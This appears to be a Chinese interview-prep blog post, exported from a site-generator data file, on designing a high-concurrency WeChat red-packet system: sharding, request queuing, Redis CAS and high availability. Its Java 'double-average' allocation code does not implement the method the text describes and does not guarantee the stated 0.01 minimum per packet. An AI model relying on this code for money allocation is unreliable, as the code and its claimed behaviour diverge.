ID，按一定的规则（如按 ID 尾号取模等），垂直上下切分。\n\n切分后，一个垂直链条上的逻辑 Server 服务器、DB 统称为一个 SET。\n\n各个 SET 之间相互独立，互相解耦。并且同一个红包 ID 的所有请求，包括发红包、抢红包、拆红包、查详情详情等，垂直 stick 到同一个 SET 内处理，高度内聚。\n\n通过这样的方式，系统将所有红包请求这个巨大的洪流分散为多股小流，互不影响，分而治之，如下图所示。\n\n![](./2024/05/28/百亿流量红包系统/7.png)\n这个方案解决了同时存在海量事务级操作的问题，将**海量化为小量**。\n\n##### 2- 解决DB并发：逻辑Server层将请求排队。\n\n红包系统是资金交易系统，DB 操作的事务性无法避免，所以会存在“并发抢锁”问题。但是如果到达 DB 的事务操作（也即拆红包行为）不是并发的，而是串行的，就不会存在“并发抢锁”的问题了。\n\n按这个思路，为了使拆红包的事务操作串行地进入 DB，只需要将请求在 Server 层以 FIFO（先进先出）的方式排队，就可以达到这个效果。从而问题就集中到 Server 的 FIFO 队列设计上。\n\n红包系统设计了分布式的、轻巧的、灵活的 FIFO 队列方案。其具体实现如下：\n\n**1）将同一个红包 ID 的所有请求 stick 到同一台 Server。**\n\n上面 SET 化方案已经介绍，同个红包 ID 的所有请求，按红包 ID stick 到同个 SET 中。\n\n不过在同个 SET 中，会存在多台 Server 服务器同时连接同一台 DB（基于容灾、性能考虑，需要多台 Server 互备、均衡压力）。\n\n为了使同一个红包 ID 的所有请求，stick 到同一台 Server 服务器上，在 SET 化的设计之外，微信红包系统添加了一层基于红包 ID hash 值的分流，如下图所示。\n\n\n> 以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。\n\n**2）设计单机请求排队方案。**\n\n将 stick 到同一台 Server 上的所有请求在被接收进程接收后，按红包 ID 进行排队。\n\n然后串行地进入 worker 进程（执行业务逻辑）进行处理，从而达到排队的效果，如下图所示。\n\n![](./2024/05/28/百亿流量红包系统/9.png)\n**3）增加 Redis缓存 控制并发。**\n\n为了防止 Server 中的请求队列过载导致队列被降级，从而所有请求拥进 DB，系统增加了与 Server 服务器同机部署的 Redis ，用于控制拆同一个红包的请求并发数。\n\n具体来说，利用 Redis 的 CAS 原子累增操作，控制同时进入 DB 执行拆红包事务的请求数，超过预先设定数值则直接拒绝服务。用于 DB 负载升高时的降级体验。\n\n通过以上三个措施，系统有效地控制了 DB 的“并发抢锁”情况。\n\n##### 3- 系统性能稳定性保障：双维度分库分表设计。\n\n红包系统的分库表规则，初期是根据红包 ID 的 hash 值分为多库多表。\n\n随着红包数据量逐渐增大，单表数据量也逐渐增加。而 DB 的性能与单表数据量有一定相关性。当单表数据量达到一定程度时，DB 性能会有大幅度下降，影响系统性能稳定性。\n\n采用冷热分离，将历史冷数据与当前热数据分开存储，可以解决这个问题。\n\n处理微信红包数据的冷热分离时，系统在以红包 ID 维度分库表的基础上，增加了以循环天分表的维度，形成了双维度分库表的特色。\n\n具体来说，就是分库表规则像 db\\_xx.t\\_y\\_dd 设计，其中，xx/y 是红包 ID 的 hash 值后三位，dd 的取值范围在 01~31，代表一个月天数最多 31 天。\n\n通过这种双维度分库表方式，解决了 DB 单表数据量膨胀导致性能下降的问题，保障了系统性能的稳定性。同时，在热冷分离的问题上，又使得数据搬迁变得简单而优雅。\n\n综上所述，微信红包系统在解决高并发问题上的设计，主要采用了 **SET 化分治**、**请求排队**、**双维度分库表**等方案，使得单组 DB 的并发性能大幅度提升，取得了很好的效果。\n\n#### 红包分配算法\n\n抢红包后，我们需要进行拆红包，接下来我们讨论一下红包系统的红包分配算法。\n\n红包金额分配时，由于是随机分配，所以有两种实现方案：**实时拆分和预先生成**\n\n##### 1- 实时拆分\n\n实时拆分，指的是在**抢红包时实时计算**每个红包的金额，以实现红包的拆分过程。\n\n这个对系统性能和拆分算法要求较高，例如拆分过程要一直保证后续待拆分红包的金额不能为空，不容易做到拆分的红包金额服从**正态分布**规律。\n\n##### 2- 预先生成\n\n预先生成，指的是在红包**开抢之前**已经完成了红包的**金额拆分**，抢红包时只是依次取出拆分好的红包金额。\n\n这种方式对拆分算法要求较低，可以拆分出随机性很好的红包金额，但通常需要结合队列使用。\n\n##### 3- 二倍均值法\n\n综合上述优缺点考虑，以及微信群聊中的人数不多（目前最高 500 人），所以我们采用实时拆分的方式，用**二倍均值法**来生成随机红包，只满足随机即可，不需要正态分布。\n\n```\n\n\n使用二倍均值法生成的随机数，每次随机金额会在  0.01 ~ 剩余平均值\\*2 之间。  \n\n\n\n```\n\n假设当前红包剩余金额为 10 元，剩余个数为 5，**10/5 = 2**，则当前用户可以抢到的红包金额为：**0.01 ~ 4** 元之间。\n\n以下是使用Java实现的二倍均值算法，在红包分配场景中。\n\n```\n\n\npublic class RedPacketDistribution {  \n  \n    public static List<BigDecimal> distribute(BigDecimal totalAmount, int totalCount) {  \n        // 校验总金额是否为正  \n        if (totalAmount.compareTo(BigDecimal.ZERO) <= 0) {  \n            throw new IllegalArgumentException(\"Invalid parameter, totalAmount must be positive.\");  \n        }  \n        // 校验红包总数是否至少为1  \n        if (totalCount < 1) {  \n            throw new IllegalArgumentException(\"Invalid parameter, totalCount must be at least 1.\");  \n        }  \n  \n        List<BigDecimal> redPacketList = new ArrayList<>(totalCount);  \n        BigDecimal remainingAmount = totalAmount.multiply(BigDecimal.valueOf(2)); // 初始化为总金额的两倍  \n        ThreadLocalRandom random = ThreadLocalRandom.current(); // 使用线程安全的随机数生成器  \n  \n        for (int i = 0; i < totalCount - 1; i++) {  \n            // 随机获取一个幸运值，范围在\\[0, 当前剩余金额)  \n            BigDecimal luckValue = BigDecimal.valueOf(random.nextDouble()).multiply(remainingAmount);  \n            // 计算并添加实际分配的红包金额（幸运值的一半）  \n            BigDecimal amount = luckValue.divide(BigDecimal.valueOf(2), BigDecimal.ROUND\\_HALF\\_DOWN);  \n            redPacketList.add(amount);  \n            // 更新剩余金额  \n            remainingAmount = remainingAmount.subtract(luckValue);  \n        }  \n  \n        // 最后一个红包直接拿走剩余的全部金额，确保总和正确  \n        redPacketList.add(remainingAmount.divide(BigDecimal.valueOf(2), BigDecimal.ROUND\\_HALF\\_DOWN));  \n  \n        return redPacketList;  \n    }  \n  \n    public static void main(String\\[\\] args) {  \n        BigDecimal totalAmount = new BigDecimal(\"100.00\"); // 红包总金额  \n        int totalCount = 10;      // 红包个数  \n        List<BigDecimal> redPackets = distribute(totalAmount, totalCount);  \n  \n        System.out.println(\"Red packet distribution:\");  \n        for (BigDecimal amount : redPackets) {  \n            System.out.printf(\"%.2f, \", amount);  \n        }  \n    }  \n}  \n\n\n\n```\n\n> 以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。\n\n## 红包系统高可用架构设计\n\n红包业务量级的高速发展，对后台系统架构的可用性要求越来越高。在保障微信红包业务体验的前提下，红包后台系统进行了一系列高可用方面的优化设计。\n\n要保障红包系统架构的高可用性，可以从多个方面进行优化和设计。以下是一些详细说明：\n\n1.  **系统架构设计**：\n\n\n*   **信息流、业务流、资金流分离**：红包系统由信息流、业务流、资金流三部分组成，这三部分在组织架构上应由不同的后台团队完成，以提高系统的模块化和可维护性。\n\n*   **微服务架构**：采用微服务架构，将红包系统拆分成多个独立的服务，每个服务负责特定的功能，这样可以提高系统的可扩展性和容错性。\n\n*   **无状态设计**：确保红包系统的服务是无状态的，即服务不需要保存用户的会话信息，这样可以提高系统的并发处理能力和可靠性。\n\n\n3.  **高可用性策略**：\n\n\n*   **冗余部署**：将系统的关键组件部署在多台服务器上，通过搭建主备或者集群的架构来实现冗余。当主服务器出现故障时，备用服务器能够自动接管，保证系统的可用性。\n\n*   **负载均衡**：通过将流量分发到多台服务器上，均衡系统的请求负载，提高系统的可用性和扩展性。负载均衡可以通过硬件（如负载均衡器）或者软件（如Nginx、HAProxy）实现。\n\n*   **服务容器化**：使用容器技术（如Docker、Kubernetes）将应用程序与其依赖项打包为容器，实现快速部署、弹性扩展和自动化管理。容器化可以提高系统的可移植性、弹性和可伸缩性，从而增加系统的高可用性。\n\n\n5.  **数据保障**：\n\n\n*   **数据备份与恢复**：定期对关键数据进行备份，并确保备份的数据可用性。这样，在发生数据丢失或损坏时，可以快速恢复数据，减少系统停机时间。\n\n*   **分布式缓存**：使用多级缓存技术（如Redis、Memcached等），将数据分别存储在内存缓存、本地缓存和分布式缓存中，以提高访问速度和降低数据库压力。\n\n*   **数据一致性**：使用分布式锁技术来保护红包的领取操作，确保每个用户只能领取一次红包。同时，为了保证数据一致性，可以采用消息队列等技术实现请求的异步处理和结果的返回。\n\n\n7.  **监控与告警**：\n\n\n*   **系统监控**：对红包系统的关键指标（如请求量、响应时间、错误率等）进行实时监控，以便及时发现和解决潜在问题。\n\n*   **告警机制**：设置合理的告警阈值，当系统出现异常情况时，及时发送告警通知给相关人员，以便快速响应和处理。\n\n\n9.  **安全性保障**：\n\n    通过以上措施的综合应用，可以大大提高红包系统架构的高可用性，确保系统在高峰时段能够稳定、高效地运行。\n\n\n*   **访问控制**：实施严格的访问控制策略，确保只有授权的用户才能访问红包系统。\n\n*   **数据加密**：对敏感数据进行加密存储和传输，以防止数据泄露和篡改。\n\n*   **安全审计**：定期对红包系统进行安全审计和漏洞扫描，及时修复发现的安全漏洞和隐患。\n\n\n#### 1 - 系统可用性影响因素\n\n**系统的可用性影响因素可分成两类：**\n\n*   一类计划外；\n\n    计划外包含很多因素，系统用到的所有东西都可能产生故障，都可能成功影响可用性的因素。从这个角度上来讲，可以说故障是无法避免的，系统的运作一定会产生故障，尤其是服务器有成千上万个的时候。\n\n*   一类计划内。\n\n    计划内的影响因素，主要有与升级相关、运维相关的操作，以及日常的备份等。这一类影响因素，通过精细地设计方案，是可以避免对可用性造成影响的。\n\n\n#### 2 - 红包系统可用性设计方向\n\n基于上面两个分析结论，可以总结出红包系统的可用性的设计方向。\n\n> 1.在不能避免意外故障的情况下，尽可能降低出现意外故障时对可用性的影响。\n>\n> 2.绝大多数计划内的日常维护可以通过方案的设计避免影响可用性，其中平行扩容特指关于存储层的平行扩容。\n\n下面从降低故障影响和微信红包系统的平行扩容两方面进行分析。\n\n首先是降低意外故障的影响，重点讲解订单存储层在订单 DB 故障的情况下如何降低对红包系统可用性的影响。\n\n#### 3 - 业务逻辑层 - 部署方案设计\n\n首先是业务逻辑层的部署方案。业务逻辑层是无状态的，微信红包系统的业务逻辑层，部署在两个城市，即两地部署，每一个城市部署至少三个园区，即三个 IDC。并且每个服务需要保证三个 IDC 的部署均衡。另外，三个 IDC 总服务能力需要冗余三分之一，当一个 IDC 出现故障时，服务能力仍然足够。从而达到 IDC 故障不会对可用性产生影响。\n\n#### 4 - 业务逻辑层 - 异步化设计\n\n如下图所示，微信红包的某些步骤不实时完成也不会影响用户对红包业务可用性的体验。\n\n比如拆红包，正常的业务流程很长，但关键步骤只有订单相关的几步。\n\n至于转零钱、写红包记录等操作不需要实时。\n\n用户抢到红包时，一般不会实时去钱包查看微信零钱，而是在微信群中点开消息查看本次抢到金额和他人抢红包金额。\n\n所以拆红包时只需要从 cache 查询用户是否拆过红包，然后写入拆红包的订单记录，更新发红包订单，其他的操作都可以异步化。\n\n当然，不是每个业务都可以进行异步化设计，需要进行业务分析，判断是否存在非关键步骤之外的事情可以将其异步化，并通过异步对账保证最终一致。\n\n经过上述分析之后，可以采用如下思路与方案：\n\n> 实现思路：\n>\n> 1.最简关键路径：简化发红包、拆红包核心流程路径，重点关注与订单相关流程。\n>\n> 2.快慢分离：将核心流程与其他非关键步骤分离。\n>\n> 方案：\n>\n> 1.写用户记录、零钱入账使用MQ异步执行\n>\n> 2.增加对帐机制保障最终一致。\n\n![](./2024/05/28/百亿流量红包系统/11.png)\n如上图所示，微信红包的某些步骤不实时完成也不会影响用户对红包业务可用性的体验。\n\n比如拆红包，正常的业务流程很长，但关键步骤只有订单相关的几步。\n\n至于转零钱、写红包记录等操作不需要实时。\n\n用户抢到红包时，一般不会实时去钱包查看微信零钱，而是在微信群中点开消息查看本次抢到金额和他人抢红包金额。\n\n所以拆红包时只需要从 cache 查询用户是否拆过红包，然后写入拆红包的订单记录，更新发红包订单，其他的操作都可以异步化。\n\n当然，不是每个业务都可以进行异步化设计，需要进行业务分析，判断是否存在非关键步骤之外的事情可以将其异步化，并通过异步对账保证最终一致。\n\n> 以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。\n\n#### 5 - 订单存储层 - 故障自愈\n\n为解决 DB 间的相互影响，需要将 DB 间相互隔离，订单存储层 SET 化。\n\nSET 化指订单 DB 和订单接入 SERVER 垂直 stick 一起。业务逻辑层访问订单时，根据订单倒数第二、三位数字找到所属订单 SET，一个 SET 的请求不能路由到其他 SET。\n\n通过 SET 化得到的好处是，控制 DB 连接数、隔离故障影响和分流并发。\n\n![](./2024/05/28/百亿流量红包系统/10.png)\n如上图所示，所设尾号 90-99 的 SET 故障时，如果业务逻辑服务后续不再生成属于这个 SET 的订单，那后续的业务就可以逐渐恢复。\n\n也就是在发生故障时，业务逻辑层发布一个版本，屏蔽故障号段的单号生成，就可以恢复业务。\n\n进一步想，除了人为发版本，有没有方法可以让 DB 故障时自动恢复？\n\n在 DB 故障导致业务失败时，业务逻辑层可获取到故障 DB 的号段，在发红包时，将这些故障的号段，换一个可用的号段就可恢复业务。\n\n订单号除了最后三位，前面的部分已能保证该红包唯一性，后面的数字只代表着分库表信息，故障时只需要将最后三位换另外一个 SET 便可自动恢复。\n\n完成这个设计后，即使 DB 出现故障，业务的可用性也不会有影响。\n\n这里还有一点，新的发红包请求可避免 DB 故障的影响，但那些故障之前已发出未被领取的红包，红包消息已发送到微信群，单号已确定，拆红包时还是失败。\n\n对这种情况，由于不会有增量，采用正常的主备切换解决即可。\n\n#### 6 - 订单存储层 - 平行扩容设计\n\n\n红包系统的高可用架构设计，主要包括了部署设计、SET 化设计、异步化设计、DB 故障自愈能力建设、平行扩容设计。\n\n> 以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。\n\n### 总结\n\n红包系统是一个高并发的资金交易系统，最大的技术挑战是保障并发性能与资金安全。\n\n这种全新的技术挑战，传统的“秒杀”系统设计方案已不能完全解决。\n\n在分析了业界“秒杀”系统解决方案的基础上，红包系统采用了 SET 化、请求排队串行化、双维度分库表等设计，形成了独特的高并发、资金安全系统解决方案。\n\n## 说在最后：有问题找老架构取经\n\n超高并发红包架构，一定是一个超级牛掰的简历亮点项目，黄金项目，稍微晚点把全量的架构方案和视频进行发布。\n\n这个项目写入简历，面试的时候如果大家能对答如流，如数家珍，基本上 面试官会被你 震惊到、吸引到。\n\n最终，**让面试官爱到 “不能自已、口水直流”**。offer， 也就来了。\n\n\n\n","source":"_posts/百亿流量红包系统.md","raw":"---\ntitle: 百亿流量红包系统\ndate: 2024-05-28 20:40:48\ntags: 架构\ncategories: 面试\n---\n\n# 百亿流量红包系统，如何架构？（字节面试真题）\n\n\n\n\n## 说在前面\n\n在读者交流群(50+)中，最近有小伙伴拿到了一线互联网企业如得物、阿里、滴滴、极兔、有赞、希音、百度、网易、美团的面试资格，遇到很多很重要的架构类/设计类的场景题：\n\n> 1.如何设计百亿流量高并发红包系统 ，请说出你的方案？\n>\n> 2.听说你会架构设计，请问一下如果让你来设计百亿流量红包系统，说说你的架构设计方案。\n\n最近有小伙伴在面试字节，又遇到了红包架构问题。小伙伴支支吾吾的说了几句，面试挂了。\n\n所以，给大家做一下系统化、体系化的梳理，使得大家内力猛增，可以充分展示一下大家雄厚的 “技术肌肉”，**让面试官爱到 “不能自已、口水直流”**，然后实现”offer直提”。\n\n\n## 本文目录\n\n**\\- 说在前面**\n\n**\\- 本文目录**\n\n- 红包架构背景\n\n#####     -红包系统和秒杀系统的对比\n\n**\\- 红包系统功能分析**\n\n- 功能1：包红包\n\n- 功能2：发红包\n\n- 功能3：抢红包\n\n- 功能4：拆红包\n\n#####     -微信红包的业务特点\n\n#####     -微信红包的技术难点\n\n- 红包系统概要设计\n\n#####     -系统功能说明\n\n**\\- 数据库设计**\n\n#####     -发红包\n\n#####     -抢红包\n\n**\\- 红包系统详细设计**\n\n- 红包整体架构\n\n- 高并发常用解决方案\n\n- 1- 使用内存替代实时的DB\n\n- 2- 使用乐观锁替代悲观锁\n\n#####     -JVM CAS 乐观锁方案\n\n**\\- 微信红包系统的高并发解决方案**\n\n#####     -1- 分而治之：系统架构设计垂直Set化。\n\n#####     -2- 解决DB并发：逻辑Server层将请求排队。\n\n#####     -3- 系统性能稳定性保障：双维度分库分表设计。\n\n#####  - 红包分配算法\n\n#####     -1- 实时拆分\n\n#####     -2- 预先生成\n\n#####     -3- 二倍均值法\n\n**\\- 红包系统高可用架构设计**\n\n#####     -1 - 系统可用性影响因素\n\n#####     -2 - 红包系统可用性设计方向\n\n#####     -3 - 业务逻辑层 - 部署方案设计\n\n#####     -4 - 业务逻辑层 - 异步化设计\n\n#####     -5 - 订单存储层 - 故障自愈\n\n#####     -6 - 订单存储层 - 平行扩容设计\n\n- 总结\n\n\n\n### 红包架构背景\n\n红包是一种 瞬时流量很大的应用， 会在很短的时间内，产生巨大的瞬时流量，\n\n所以，作为架构师来说，这种场景有很大的架构挑战\n\n以2017年除夕为例，微信红包峰值QPS在76w左右，除夕当天收发微信红包的数量为142亿个。\n\n这种百亿级别的数据量、100Wqps级别的超高并发，而且整个系统核心功能和支付相关，需要做好高并发、高可用、高可靠。\n\n> 特别说明：红包架构也是高端面试的核心场景题, 后面也会以视频的形式，对这些架构的一系列的架构场景题目，做系统化的介绍。\n>\n> 架构团队会录制成为架构视频， 帮助大家做架构拿高薪。\n\n#### 红包系统和秒杀系统的对比\n\n我们先了解下微信红包支付的流程。\n\n![](./2024/05/28/百亿流量红包系统/1.png)\n在上面的红包流程中，核心业务包含包红包、发红包、抢红包、拆红包\n\n![](./2024/05/28/百亿流量红包系统/2.png)\n其中最关键的步骤是\n\n*   发红包\n\n*   抢红包。\n\n\n在整个体系中，红包系统 是 支付系统的商户，红包这个商户出售的是钱。\n\n所以，用户发红包在红包系统 使用微信支付购买一份 红包商品，红包系统 将钱发放到相对应的微信群，供参与者领取。\n\n微信群里的用户抢红包，得到的是商品里边的 零钱。\n\n在整个体系中，红包系统 和支付系统 之间的关系是商家和第三方支付平台的关系。\n\n红包的流程，很类似 商品“秒杀”活动。\n\n*   包红包类似秒杀商品管理\n\n*   发红包类似“秒杀”活动的商品上架；\n\n*   抢红包等同于“秒杀”活动中的查询库存；\n\n*   拆红包对应“秒杀”活动中用户的“秒杀”动作。\n\n\n不过除了上面的相同点之外，红包业务 与 “秒杀”活动相比，还具备自身的特点：\n\n首先，抢红包 比 “秒杀”有更海量的并发要求。假设同一时间有 10 万个群里的用户同时在发红包，那就相当于同一时间有 10 万个“秒杀”活动发布出去。10 万个微信群里的用户同时抢红包，将产生海量的并发请求。\n\n其次，微信红包业务要求更严格的安全级别。红包业务本质上是资金交易。资金交易业务比普通商品“秒杀”活动有更高的安全级别要求。\n\n*   **“秒杀”时可以允许存在“超卖”（即实际被抢的商品数量比计划的库存多）、“少卖”（即实际被抢的商户数量比计划的库存少）的情况。**\n\n*   **但是对于 红包，不允许存在“超卖”、“少卖”。**\n\n\n> 特别说明：红包架构也是高端面试的核心场景题, 后面也会以视频的形式，对这些架构的一系列的架构场景题目，做系统化的介绍。\n>\n> 架构团队会录制成为架构视频， 帮助大家做架构拿高薪。\n\n## 红包系统功能分析\n\n接下来，40岁老架构带大家，从架构师视角开始红包系统的功能分析。\n\n微信红包和微信支付之间的交互，与普通商家与微信支付的交互一样，需要经过多个步骤。\n\n*   用户发红包时，进入微信红包下一笔订单，系统记录发红包用户、发红包金额、红包数量和要发送到的用微信群。\n\n*   然后微信红包系统请求微信支付服务器进行下单，用户使用微信支付进行支付。\n\n*   支付成功后，微信支付后台系统通知微信红包后台系统支付成功结果，微信红包后台系统收到通知后推送微信红包消息到微信群。\n\n*   微信群里用户便可抢红包。\n\n*   用户发现红包还有剩余，就可以拆剩下的红包\n\n\n这就是微信红包和微信支付的关系以及交互过程。\n\n\n### 功能1：包红包\n\n系统给每个红包分配一个唯一ID，也就是发红包的订单号，然后将红包发送给用户，红包的个数，红包金额写入到存储。\n\n### 功能2：发红包\n\n用户使用微信支付完成付款，微信红包后台收到微信支付成功的通知。红包系统将红包发送订单状态更新，更新为用户已支付，并写入用户发红包记录表，这样用户可以在钱包中找到用户的发红包流水和收发红包的记录，之后微信红包系统调用微信通知，将微信红包信息发送到微信群。\n\n### 功能3：抢红包\n\n微信群中的用户收到红包消息之后，点开红包，开始抢红包，这个过程微信红包系统会检查红包是否已经被抢完，是否已经过期，是否已经抢过等验证逻辑。\n\n### 功能4：拆红包\n\n拆红包是整个发红包流程最复杂的一个操作，需要查询这个红包的红包订单，判断用户是否可以拆包，计算本次可拆到的红包金额，并记录抢红包流水。\n\n拆红包包括如下步骤：\n\n*   1）查询这个红包发送订单，判断用户是否可拆，然后计算本次可拆到的红包金额；\n\n*   2）然后写入一条抢红包记录。如果把拆红包过程，类比为一个秒杀活动的过程，相当于扣库存与写入秒杀记录的过程；\n\n*   3）更新库存对应于更新红包发送订单，写入秒杀记录对应于写入这个红包的领取红包记录；\n\n*   4）另外，还要写入用户整体的红包领取记录；\n\n*   5）最后请求微信支付系统给拆到红包用户转入零钱，成功后更新抢红包的订单状态为已转账成功。\n\n![](./2024/05/28/百亿流量红包系统/5.png)\n\n拆红包过程类似于一个秒杀活动的过程，需要做好库存扣减和秒杀记录的操作。\n\n更新库存就是更新红包发送的订单，写入秒杀记录就是写入红包领取的信息流水。\n\n还需要以用户为中心记录用户整体的红包领取记录。\n\n最后调用支付系统将拆红包后的金额转入用户零钱中，成功之后更新抢红包的订单状态为转账成功。\n\n> 所以，在看此文之前，最好看看的高并发三部曲的Java高并发核心编程卷3\\*（注意是最新的清华大学出版社出版的加强版），里边有秒杀架构，可以作为知识铺垫。\n\n#### 微信红包的业务特点\n\n微信红包，特别是群红包，业务形态上类似于普通商品的\"秒杀\"活动。\n\n*   包红包类似秒杀商品管理\n\n*   发红包类似“秒杀”活动的商品上架；\n\n*   抢红包等同于“秒杀”活动中的查询库存；\n\n*   拆红包对应“秒杀”活动中用户的“秒杀”动作。\n\n    微信红包在业务形态上和普通商品\"秒杀\"活动相比，还有自身特点：\n\n\n1.  **海量并发请求**：微信红包用户在微信群发一个红包，等同于在网上发布一次商品\"秒杀\"活动，假设同时有10万个群的用户同时发红包，那就相当于同一时间有10万个\"秒杀\"活动发布。10万个微信群的用户同时抢红包，将产生海量并发请求。\n\n2.  **更严格的安全级别**：微信红包业务本质上是资金交易，微信红包是微信支付的一个商户，提供资金流转服务，用户发红包相当于在微信红包这个商户上使用微信支付购买了一笔\"钱\"，且收货地址是微信群。当用户支付成功后，红包\"发货\"到微信群里，群里的用户拆开红包后，微信红包提供了将\"钱\"转入拆红包用户微信零钱的服务。\n\n3.  **订单层南北独立体系**：微信红包系统采用南北独立体系的订单层设计，即数据在南北两个系统中不同步。用户就近接入系统，请求发红包时，系统会根据用户所在地分配订单到南或北的系统，并在订单号上打上南北标识。这种设计有助于分摊流量，降低系统风险。\n\n4.  **流量闭环**：在抢红包、拆红包、查红包详情列表时，接入层会根据红包单号上的南北标识，将流量分别引导到对应的南北系统闭环。这意味着，无论是发红包还是抢红包，用户都能够在就近的系统中完成操作，无需跨城，提高了系统的响应速度和稳定性。\n\n5.  **用户数据处理**：微信红包系统的用户数据采取写多读少、全量保存的策略。用户数据的查询入口在微信钱包中，相对隐藏，访问量不会太大，且被视为可旁路的非关键信息，实时性要求不高。这种设计方式可以减少数据存储的压力，提高系统性能。\n\n6.  **实时计算红包金额**：\n\n    微信红包的金额是在拆红包时实时计算的，而不是预先分配的。系统会在拆红包时取0.01到剩余平均值\\*2之间的数值作为红包金额。\n\n    这种实时计算的方式基于内存进行，不需要额外的存储空间，且计算效率很高。\n\n    同时，为了保证操作的原子性，拆包过程中使用了CAS（Compare-and-Swap）算法，确保每次只有一个并发用户拆包成功。如果拆包CAS失败，系统会自动进行重试，但也可能在重试过程中被其他用户抢得先机而空手而归。\n\n7.  **架构演进**：随着微信红包功能的不断发展和用户量的增长，其系统架构也经历了不断的演进和优化。从最初的数据库硬抗整个流量，到后来的使用缓存（cache）抗流量，再到现在的南北独立体系等设计，都是为了更好地应对高并发、提升系统性能和稳定性。\n\n    资金交易业务比普通商品\"秒杀\"有更高的安全级别要求，普通的商品\"秒杀\"由商户提供，库存是商户预设，\"秒杀\"允许存在超卖和少卖的情况，但对于微信红包，用户发100元的红包绝对不可以拆出101元，以及只被领取99元时，剩下的1元在24小时过期后要精准退还给发红包用户。\n\n    总的来说，微信红包系统架构的设计充分考虑了用户量、并发量、性能要求等因素，通过南北独立体系、流量闭环、用户数据处理、实时计算红包金额以及架构演进等多种手段，保证了系统的稳定运行和良好用户体验。\n\n\n#### 微信红包的技术难点\n\n微信红包系统架构的技术难点主要体现在以下几个方面：\n\n1.  **高并发难点**：\n\n    微信红包在特定时间（如春节、节假日等）会面临极高的并发量，如何有效地处理这些并发请求，保证系统的稳定性和响应速度，是红包系统架构设计的关键挑战之一。\n\n2.  **资金安全难点**：\n\n    红包系统涉及到资金的转移和存储，因此资金安全是系统设计的重中之重。如何确保资金安全，防止被攻击或篡改，是系统架构设计中需要重点考虑的问题。\n\n    红包业务涉及资金交易，所以一定不能出现超卖、少卖的情况。\n\n\n*   超卖：发了 10 块钱，结果抢到了 11 块钱，多的钱只能系统补上，如此为爱发电应用估计早就下架了；\n\n*   少卖：发了 10 块钱，只抢了 9 块，多的钱得原封不动地退还用户，否则第二天就接到法院传单了。\n\n\n4.  **用户体验难点**\n\n    红包系统需要保证良好的用户体验，包括响应速度、公平性（先抢先得）、成功率等。\n\n    如何在高并发场景下保证用户体验，是系统架构设计的重要目标。\n\n    了解下微信红包的用户体验 的4大核心：摇/发/抢/拆。\n\n\n*   摇：摇的流畅\n\n*   快：抢的要快\n\n*   爽：拆的爽\n\n*   稳：能分享出去\n\n\n6.  **数据一致性难点**：\n\n    红包系统需要保证数据的一致性，包括红包库存数据、用户账户数据等。如何在高并发场景下保证数据的一致性，是系统架构设计的重要挑战。\n\n\n*   参与用户越多，并发 DB 请求越大，数据越容易出现事务问题，所以系统得做好**事务一致性**；\n\n*   抢红包系统涉及金钱交易，所以事务级别要求更高，**不能出现脏数据**。\n\n\n8.  **系统扩展性难点**：\n\n    随着用户量和业务量的增长，红包系统需要具备良好的扩展性，能够方便地增加新的功能或提升性能。\n\n    如何设计可扩展的系统架构，是系统架构设计的重要考虑因素。\n\n    为了解决这些技术难点，我们可以采用多种技术手段，如分而治之、负载均衡、读写分离、水平切分、垂直切分等，来提升系统的性能和稳定性。同时，系统还采用了柔性服务、系统降级等策略，来保证在有限资源下满足用户的核心需求。\n\n\n### 红包系统概要设计\n\n#### 系统功能说明\n\n抢红包功能允许用户在群聊中发送任意个数和金额的红包，群成员可以抢到随机金额的红包，但要**保证每个用户的红包金额不小于 0.01 元**。\n\n![](./2024/05/28/百亿流量红包系统/3.png)\n抢红包的详细交互流程如下：\n\n1.  用户接收到抢红包通知，点击通知打开群聊页面；\n\n2.  用户点击抢红包，后台服务验证用户资格，确保用户尚未领取过此红包；\n\n3.  若用户资格验证通过，后台服务分配红包金额并存储领取记录；\n\n4.  用户在微信群中看到领取金额，红包状态更新为“已领取”；\n\n5.  异步调用支付接口，将红包金额更新到钱包里。\n\n\n## 数据库设计\n\n**红包表：redpack**\n\n红包表用来记录用户发了多少红包，以及需要维护的剩余金额，\n\n红包表：redpack的字段如下：\n\n| 字段 | 描述 |\n| --- | --- |\n|id|主键，红包ID。|\n|user_id|发送红包的用户id。|\n|total_amount|红包总金额。|\n|surplus_amount|红包剩余金额。|\n|total|红包总数。|\n|surplus_total|剩余红包总数。|\n\n**红包记录表：redpack\\_record**\n\n| 字段 | 描述 |\n| --- | --- |\n|id|主键，记录id。|\n|redpack_id|红包id。|\n|user_id|用户id。|\n|amount|抢到的金额。|\n\n#### 发红包\n\n设置完红包参数后，微信支付，完成付款，然后收到付款成功通知，红包系统更新红包订单状态，更新为已支付，并写入红包发送记录表。\n\n这样用户可以将用户的红包信息和红包的收发记录发出，红包系统调用微信通知，将红包信息发送到微信群。\n\n发红包的交互步骤如下：\n\n1.  用户设置红包的总金额和个数后，在红包表中增加一条数据，开始发红包；\n\n2.  为了保证实时性和抢红包的效率，在 Redis 中增加一条记录，**存储红包 ID 和总人数 n**；\n\n3.  抢红包消息推送给所有群成员。\n\n\n#### 抢红包\n\n微信群用户收到红包后，点开，红包系统会校验红包是否被抢完，是否过期。\n\n微信红包的抢红包和拆红包是两个分离的服务，用户点击抢红包后需要进行两次操作。\n\n这也是为什么明明有时候抢到了红包，点开后却发现**该红包已经被领取完了**。\n\n抢红包的交互步骤如下：\n\n1.  抢红包：抢操作在 Redis 缓存层完成，通过原子递减的操作来更新红包个数，个数递减为 0 后就说明抢光了。\n\n2.  拆红包：拆红包时，首先会实时计算金额，一般是通过二倍均值法实现（即 0.01 到剩余平均值的 2 倍之间）。\n\n3.  红包记录：用户获取红包金额后，通过数据库的事务操作累加已经领取的个数和金额，并更新红包表和记录表。\n\n4.  转账：为了提升效率，最终的转账为异步操作，这也是为什么在春节期间，红包领取后不能立即在余额中看到的原因。\n\n\n## 红包系统详细设计\n\n### 红包整体架构\n\n如下图所示，是微信红包的系统架构\n\n![](./2024/05/28/百亿流量红包系统/4.png)\n总体是三层架构：\n\n*   首先是微信统一接入层，下面是微信红包系统 API，包括发、抢、拆、查红包详情、查红包用户列表。\n\n*   接入层下面，是封装微信红包关键业务的逻辑服务；\n\n*   